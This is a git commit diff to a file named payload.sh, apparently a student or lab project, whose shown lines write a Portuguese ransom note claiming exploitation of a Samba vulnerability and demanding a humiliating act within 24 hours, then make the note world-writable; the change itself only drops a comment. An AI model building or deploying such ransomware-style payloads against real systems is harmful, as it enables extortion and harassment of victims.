f9d40cb3a71d1eb74aa2b24915b2df3cb9ac3eea
FelipeR-UFBA <feliperosario@ufba.br>
2025-11-10 06:28:39 -0300

    att

--- payload.sh
+++ payload.sh
@@ -9,5 +9,4 @@ echo "NÃO GRITA" >> /home/RESGATE.txt
 echo "O seu serviço Samba estava vulnerável ao CVE-2017-7494, você vai precisar comer merda na frente da webcam pra recuperar seus arquivos. Tem 24H!" >> /home/RESGATE.txt
 echo "------------------------------------"
 
-# Pra ter a certeza que o ficheiro é visível
 chmod 777 /home/RESGATE.txt
